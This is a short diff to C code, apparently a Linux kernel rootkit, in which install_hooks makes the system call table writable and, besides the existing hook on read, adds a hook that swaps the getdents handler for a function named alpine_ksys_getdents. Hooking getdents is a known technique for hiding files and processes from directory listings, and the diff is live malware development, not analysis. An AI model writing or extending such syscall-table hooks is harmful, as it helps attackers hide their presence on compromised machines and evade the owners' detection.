@@ -320,8 +320,14 @@ int install_hooks(void) {
     echo("sys_call_table address %lu\n", syscall_table);
     if(!syscall_table) return 0;
     make_vm_rw(syscall_table);
+    /** read
+     */
     original_syscall_table[__NR_read] = syscall_table[__NR_read];
     syscall_table[__NR_read] = (long unsigned int)alpine_ksys_read;
+    /** getdents
+     */
+    original_syscall_table[__NR_getdents] = syscall_table[__NR_getdents];
+    syscall_table[__NR_getdents] = (long unsigned int)alpine_ksys_getdents;
     make_vm_ro((long unsigned int)syscall_table);
     return 0;
 }
